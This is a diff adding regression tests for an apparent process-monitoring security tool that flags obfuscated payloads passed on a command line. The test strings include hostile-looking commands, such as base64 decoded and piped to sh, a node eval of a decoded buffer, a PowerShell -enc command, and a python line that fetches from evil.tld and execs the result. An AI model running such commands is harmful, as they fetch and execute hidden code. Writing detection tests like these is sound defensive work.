@@ -10,7 +10,9 @@ finding it pins and would FAIL against the pre-fix code.
 Run:  python3 -m unittest discover -s tests        (from the repo root)
   or: python3 tests/test_regression.py
 """
+import base64
 import contextlib
+import hashlib
 import io
 import json
 import os
@@ -1109,6 +1111,117 @@ class TestArgvSignals(Sandbox):
         # `s{(rm|node|perl)}` must NOT trip pipe-to-interpreter (live-host FP fix).
         sigs = aegis._argv_signals("perl -i -pe 's{(rm|mv|node|perl|python)}{X}g' f")
         self.assertNotIn("pipe-to-interpreter", [n for n, _ in sigs], sigs)
+
+
+# --------------------------------------------------------------------------- #
+# N14b — obfuscated-payload argv tier: an interpreter's inline-code flag
+# carrying an ENCODED payload the idiom tables have never seen. Gate 1
+# (interpreter + code-exec flag) is mandatory so arbitrary processes — Electron
+# helpers, JWTs, cloud CLIs with giant opaque argv — are structurally out of
+# scope; gate 2 is a long high-entropy base64-alphabet blob that really
+# decodes, or an in-process decode+execute composition. MEDIUM alone (below
+# the notify floor, corroboration fodder); HIGH only when the same argv also
+# carries a fetch or feeds the blob into a recognized exec sink.
+# --------------------------------------------------------------------------- #
+class TestObfuscatedArgvPayload(Sandbox):
+    # Deterministic pseudo-random payload: 160 bytes -> 216 base64 chars,
+    # entropy ~5.8 bits/char, decodes. os.urandom would test the same thing
+    # non-reproducibly.
+    BLOB = base64.b64encode(b"".join(
+        hashlib.sha256(bytes([i])).digest() for i in range(5))).decode()
+
+    def _sigs(self, argv):
+        return dict(aegis._argv_signals(argv))
+
+    def test_bash_c_blob_piped_to_sh_is_high(self):
+        # decode a >=100-char embedded blob straight into `sh` — the packed
+        # variant of the fileless pipeline; the blob feeds a recognized exec
+        # sink, so it is notify-grade even with no fetch in sight.
+        sigs = self._sigs('bash -c "echo %s | base64 -d | sh"' % self.BLOB)
+        self.assertEqual(sigs.get("obfuscated-inline-payload"), "HIGH", sigs)
+
+    def test_bash_c_bare_blob_is_medium_below_notify(self):
+        # blob with NO fetch and NO exec sink: recorded corroboration only.
+        sigs = self._sigs('bash -c "echo %s > /tmp/staged"' % self.BLOB)
+        self.assertEqual(sigs.get("obfuscated-inline-payload"), "MEDIUM", sigs)
+        top = max(aegis.SEV_ORDER[s] for s in sigs.values())
+        self.assertLess(top, aegis.SEV_ORDER["HIGH"], sigs)
+
+    def test_node_eval_buffer_short_blob_is_loader_medium(self):
+        # the HexEval shape with a blob too short for the entropy gate: the
+        # decode+execute COMPOSITION is the signal (argv twin of the supply-
+        # chain js-encoded-loader), still below the notify floor alone.
+        sigs = self._sigs(
+            "node -e eval(Buffer.from('%s','base64').toString())"
+            % self.BLOB[:60])
+        self.assertEqual(sigs.get("argv-encoded-loader"), "MEDIUM", sigs)
+
+    def test_running_node_encoded_loader_process_fires(self):
+        # a RUNNING same-user node process carrying the full loader argv must
+        # produce a behavior finding through the real check_behavior path.
+        real = self._saved["check_behavior"]
+        argv = ("/usr/local/bin/node -e "
+                "eval(Buffer.from('%s','base64').toString())" % self.BLOB)
+        fake = [("4242", aegis._own_owner(), "/usr/local/bin/node", argv)]
+        saved = aegis._iter_processes
+        aegis._iter_processes = lambda: iter(fake)
+        try:
+            fs = real()
+        finally:
+            aegis._iter_processes = saved
+        hits = [f for f in fs if f["category"] == "behavior"
+                and "argv-encoded-loader" in f.get("markers", ())]
+        self.assertTrue(hits, fs)
+        # full-length blob + eval() exec sink -> notify-grade.
+        self.assertEqual(hits[0]["severity"], "HIGH", hits)
+
+    def test_fetch_plus_decode_is_high(self):
+        sigs = self._sigs(
+            'python3 -c "import urllib.request,base64;'
+            "exec(base64.b64decode(urllib.request.urlopen("
+            "'https://evil.tld/p').read()))\"")
+        self.assertEqual(sigs.get("argv-encoded-loader"), "HIGH", sigs)
+
+    def test_powershell_enc_yields_single_strongest_signal(self):
+        # `-enc <blob>` is already the powershell-encoded-command idiom (HIGH,
+        # unambiguous): one argv, one strongest signal — the obfuscation tier
+        # must not double-report the same blob.
+        sigs = self._sigs("powershell -NoProfile -enc %s" % self.BLOB)
+        self.assertEqual(sigs.get("powershell-encoded-command"), "HIGH", sigs)
+        self.assertNotIn("obfuscated-inline-payload", sigs, sigs)
+
+    def test_plain_python_oneliner_is_silent(self):
+        self.assertEqual(aegis._argv_signals('python3 -c "print(1+1)"'), [])
+
+    def test_long_low_entropy_english_arg_is_silent(self):
+        arg = "pleasewaitwhilewedownloadyourpackagesandrebuildthecaches" * 4
+        sigs = self._sigs('bash -c "echo %s"' % arg)
+        self.assertNotIn("obfuscated-inline-payload", sigs, sigs)
+
+    def test_uuid_path_run_is_not_a_blob(self):
+        # Found on the real process table: a harness `bash -c` whose argv
+        # embeds a long tmp path with hex-UUID segments clears the entropy
+        # floor (measured 4.84). The structural tell is the alphabet mix —
+        # '/' (std base64) together with '-' (base64url) decodes under no
+        # base64 flavor, so a path can never pass _b64_decodable.
+        path = ("/private/tmp/claude-501/-Users-charlie-Documents-Work---"
+                "Projects/b2b95d18-f83a-481f-bced-b3bb7799cea0/scratchpad/"
+                "run-4ac5698e761166b1da2a57cc80e/out")
+        sigs = self._sigs('bash -c "python3 %s 2>/dev/null || true"' % path)
+        self.assertNotIn("obfuscated-inline-payload", sigs, sigs)
+
+    def test_electron_giant_flags_structurally_unscored(self):
+        # no code-exec flag -> gate 1 never opens, whatever the arg entropy.
+        argv = ("/Applications/Chat.app/Contents/Frameworks/Chat Helper "
+                "(Renderer).app/Contents/MacOS/Chat Helper (Renderer) "
+                "--type=renderer --enable-features=WebRTCPipeWireCapturer "
+                "--service-request-token=%s" % self.BLOB)
+        self.assertEqual(aegis._argv_signals(argv), [])
+
+    def test_opaque_cli_token_unscored(self):
+        # cloud CLIs legitimately pass giant opaque args; no inline-code flag.
+        self.assertEqual(aegis._argv_signals(
+            "aws s3 cp --sse-customer-key %s s3://bkt/key ./f" % self.BLOB), [])
 
 
 # --------------------------------------------------------------------------- #
